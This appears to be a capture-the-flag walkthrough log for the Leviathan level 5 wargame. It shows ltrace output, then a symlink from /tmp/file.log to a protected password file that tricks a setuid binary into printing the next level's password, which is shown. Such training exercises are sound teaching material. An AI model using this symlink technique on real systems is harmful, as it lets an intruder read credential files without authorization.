leviathan5@leviathan:~$ ls -alh
total 28K
drwxr-xr-x  2 root       root       4.0K Aug 26  2019 .
drwxr-xr-x 10 root       root       4.0K Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3.5K May 15  2017 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 7.4K Aug 26  2019 leviathan5
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                             = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                       = 26
exit(-1 <no return ...>
+++ exited (status 255) +++


******************We can see that the ELF binary is trying to access /tmp/file.log - lets try to create a symlink to the next levels password; because the binary is owned by leviathan6.



leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
UgaoFee4li